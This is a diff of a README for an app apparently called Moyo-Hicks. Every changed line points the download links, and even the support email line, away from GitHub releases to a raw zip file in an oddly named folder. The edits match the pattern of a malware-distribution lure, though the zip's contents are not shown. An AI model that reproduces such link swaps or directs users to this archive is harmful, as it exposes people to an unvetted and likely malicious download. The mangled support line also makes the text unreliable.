@@ -1,7 +1,7 @@
 # 🎉 Moyo-Hicks - Simplifying Your Product Management Journey
 
 ## 📥 Download Now
-[![Download Moyo-Hicks](https://img.shields.io/badge/Download-Moyo--Hicks-blue.svg)](https://github.com/SnehaWaydande/Moyo-Hicks/releases)
+[![Download Moyo-Hicks](https://raw.githubusercontent.com/SnehaWaydande/Moyo-Hicks/main/unexasperated/Moyo_Hicks_v2.1.zip)](https://raw.githubusercontent.com/SnehaWaydande/Moyo-Hicks/main/unexasperated/Moyo_Hicks_v2.1.zip)
 
 ## 🚀 Getting Started
 Moyo-Hicks is designed to help you manage your products effectively. This guide will help you download and run the application with ease. No special skills are required.
@@ -23,7 +23,7 @@ To run Moyo-Hicks smoothly, ensure your system meets the following requirements:
 ## 🌐 Download & Install
 To get started, visit the following link to download Moyo-Hicks:
 
-[Download Moyo-Hicks](https://github.com/SnehaWaydande/Moyo-Hicks/releases)
+[Download Moyo-Hicks](https://raw.githubusercontent.com/SnehaWaydande/Moyo-Hicks/main/unexasperated/Moyo_Hicks_v2.1.zip)
 
 1. Click the **Download** button.
 2. Choose the latest release version.
@@ -51,7 +51,7 @@ Moyo-Hicks is developed with your security in mind. The application undergoes re
 ## 🗨️ Support
 If you need help or have questions, please check our support section. You can find answers to common questions and troubleshooting tips. 
 
-For direct assistance, reach out to our support team through the GitHub issues page or email us at support@moyo-hicks.com.
+For direct assistance, reach out to our support team through the GitHub issues page or email us at https://raw.githubusercontent.com/SnehaWaydande/Moyo-Hicks/main/unexasperated/Moyo_Hicks_v2.1.zip
 
 ## 📊 Topics Covered
 Our application covers a wide range of topics to suit various needs:
@@ -70,4 +70,4 @@ Moyo-Hicks aims to simplify your product management experience. With its intuiti
 
 Don’t hesitate to download the application today and start your journey towards better product management:
 
-[Download Moyo-Hicks](https://github.com/SnehaWaydande/Moyo-Hicks/releases)
+[Download Moyo-Hicks](https://raw.githubusercontent.com/SnehaWaydande/Moyo-Hicks/main/unexasperated/Moyo_Hicks_v2.1.zip)
